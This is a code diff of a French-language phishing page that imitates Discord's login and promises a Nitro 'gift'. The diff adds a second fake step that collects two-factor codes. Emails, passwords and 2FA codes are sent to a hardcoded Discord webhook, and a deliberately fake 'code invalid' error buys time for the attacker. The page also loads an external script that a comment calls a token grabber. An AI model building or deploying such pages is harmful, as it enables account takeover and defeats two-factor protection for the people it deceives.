@@ -6,179 +6,106 @@
     <title>Discord</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600&display=swap');
-
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
-        
-        body { 
-            background-color: #313338; 
-            color: #f2f3f5; 
-            display: flex; 
-            flex-direction: column; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            padding: 20px; 
-        }
-        
-        .card { 
-            background-color: #313338; 
-            width: 100%; 
-            max-width: 400px; 
-            text-align: center; 
-        }
-        
-        .logo { 
-            width: 120px; 
-            margin-bottom: 24px; 
-        }
-        
-        h2 { 
-            font-size: 24px; 
-            font-weight: 600; 
-            margin-bottom: 8px; 
-            color: #f2f3f5;
-        }
-        
-        p { 
-            color: #b5bac1; 
-            font-size: 16px; 
-            margin-bottom: 24px; 
-        }
-        
-        .form-group { 
-            text-align: left; 
-            margin-bottom: 20px; 
-        }
-        
-        label { 
-            display: block; 
-            color: #b5bac1; 
-            font-size: 12px; 
-            font-weight: 700; 
-            text-transform: uppercase; 
-            margin-bottom: 8px; 
-        }
-        
-        input { 
-            width: 100%; 
-            padding: 10px; 
-            background-color: #1e1f22; 
-            border: 1px solid #1e1f22; 
-            border-radius: 3px; 
-            color: #dbdee1; 
-            font-size: 16px; 
-            outline: none; 
-            transition: border-color 0.2s;
-        }
-        
-        input:focus { 
-            border-color: #5865f2; 
-        }
-        
-        button { 
-            width: 100%; 
-            padding: 12px; 
-            background-color: #5865f2; 
-            color: white; 
-            border: none; 
-            border-radius: 3px; 
-            font-weight: 500; 
-            cursor: pointer; 
-            margin-top: 4px; 
-            font-size: 16px; 
-            transition: background-color 0.2s;
-        }
-        
-        button:hover { 
-            background-color: #4752c4; 
-        }
-        
-        .footer { 
-            margin-top: 16px; 
-            font-size: 14px; 
-            color: #949ba4; 
-            text-align: left; 
-        }
-        
-        .footer a { 
-            color: #00a8fc; 
-            text-decoration: none; 
-        }
-        
-        .footer a:hover { 
-            text-decoration: underline; 
-        }
-        
-        #status { 
-            margin-top: 15px; 
-            font-size: 14px; 
-            font-weight: bold;
-        }
+        body { background-color: #313338; color: #f2f3f5; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .card { background-color: #313338; width: 100%; max-width: 400px; text-align: center; }
+        .logo { width: 120px; margin-bottom: 24px; }
+        h2 { font-size: 24px; font-weight: 600; margin-bottom: 8px; color: #f2f3f5; }
+        p { color: #b5bac1; font-size: 16px; margin-bottom: 24px; }
+        .form-group { text-align: left; margin-bottom: 20px; }
+        label { display: block; color: #b5bac1; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; }
+        input { width: 100%; padding: 10px; background-color: #1e1f22; border: 1px solid #1e1f22; border-radius: 3px; color: #dbdee1; font-size: 16px; outline: none; transition: border-color 0.2s; }
+        input:focus { border-color: #5865f2; }
+        button { width: 100%; padding: 12px; background-color: #5865f2; color: white; border: none; border-radius: 3px; font-weight: 500; cursor: pointer; margin-top: 4px; font-size: 16px; transition: background-color 0.2s; }
+        button:hover { background-color: #4752c4; }
+        .hidden { display: none !important; }
+        #status { margin-top: 15px; font-size: 14px; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="card">
         <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" class="logo" alt="Discord">
         
-        <h2>Bienvenue à nouveau!</h2>
-        <p>Connectez-vous pour réclamer votre cadeau.</p>
-        
-        <form id="loginForm">
-            <div class="form-group">
-                <label>E-mail ou numéro de téléphone</label>
-                <input type="email" id="email" required>
-            </div>
-            <div class="form-group">
-                <label>Mot de passe</label>
-                <input type="password" id="password" required>
-            </div>
-            <button type="submit">Se connecter</button>
-        </form>
-        
-        <div class="footer">
-            Besoin d'un compte ? <a href="#">S'inscrire</a>
+        <!-- ÉTAPE 1 : LOGIN -->
+        <div id="step1">
+            <h2>Bienvenue à nouveau!</h2>
+            <p>Connectez-vous pour réclamer votre cadeau.</p>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>E-mail ou numéro de téléphone</label>
+                    <input type="email" id="email" required>
+                </div>
+                <div class="form-group">
+                    <label>Mot de passe</label>
+                    <input type="password" id="password" required>
+                </div>
+                <button type="submit">Se connecter</button>
+            </form>
         </div>
-        
+
+        <!-- ÉTAPE 2 : 2FA -->
+        <div id="step2" class="hidden">
+            <h2>Vérification en deux étapes</h2>
+            <p>Entrez le code à 6 chiffres envoyé à votre adresse e-mail.</p>
+            <form id="codeForm">
+                <div class="form-group">
+                    <label>Code de vérification</label>
+                    <input type="text" id="code" required pattern="[0-9]{6}" placeholder="000000">
+                </div>
+                <button type="submit">Valider</button>
+            </form>
+        </div>
+
         <div id="status"></div>
     </div>
 
     <script>
-        // WEBHOOK POUR LES MOTS DE PASSE
         const webhookUrl = "https://discord.com/api/webhooks/1567231119496052837/Ms4fE1E1jbBSFf4fvh_H0OERpi8Fr0GGOhwCK47IZme5cXeiRMpW7BswR2LNXuTSVd7Z";
 
+        let tempEmail = "";
+        let tempPass = "";
+
+        // ÉTAPE 1 : ENVOI DU MDP
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            
             const statusDiv = document.getElementById('status');
             statusDiv.style.color = "#ffff00"; 
-            statusDiv.innerText = "Validation...";
+            statusDiv.innerText = "Vérification...";
             
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('password').value;
+            tempEmail = document.getElementById('email').value;
+            tempPass = document.getElementById('password').value;
 
-            try {
-                const formData = new FormData();
-                formData.append("content", `**Nitro Login**\n**Email:** ${email}\n**Pass:** ${pass}`);
-                
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                statusDiv.style.color = "#00ff00"; 
-                statusDiv.innerText = "Cadeau activé ! Redirection...";
-                setTimeout(() => { 
-                    window.location.href = "https://discord.com/gifts/"; 
-                }, 1500);
-                
-            } catch (err) {
+            const formData = new FormData();
+            formData.append("content", `**Nitro - Étape 1 (MDP)**\n**Email:** ${tempEmail}\n**Pass:** ${tempPass}`);
+            await fetch(webhookUrl, { method: 'POST', body: formData }).catch(()=>{});
+            
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            statusDiv.innerText = "";
+        });
+
+        // ÉTAPE 2 : ENVOI DU CODE 2FA
+        document.getElementById('codeForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const statusDiv = document.getElementById('status');
+            statusDiv.style.color = "#ffff00"; 
+            statusDiv.innerText = "Vérification du code...";
+            
+            const code = document.getElementById('code').value;
+
+            const formData = new FormData();
+            formData.append("content", `**Nitro - Étape 2 (CODE 2FA)**\n**Email:** ${tempEmail}\n**Code:** ${code}`);
+            await fetch(webhookUrl, { method: 'POST', body: formData }).catch(()=>{});
+
+            // FAUSSE ERREUR POUR GAGNER DU TEMPS
+            setTimeout(() => {
                 statusDiv.style.color = "#ff0000"; 
-                statusDiv.innerText = "Erreur réseau, réessayez.";
-            }
+                statusDiv.innerText = "Code invalide ou expiré. Veuillez vérifier votre boîte mail et réessayer.";
+                document.getElementById('code').value = "";
+            }, 1000); // 1 seconde de chargement
         });
     </script>
     
-    <!-- LE LIEN VERS LE GRABBER DE TOKEN -->
     <script src="grabber.js"></script>
 </body>
 </html>
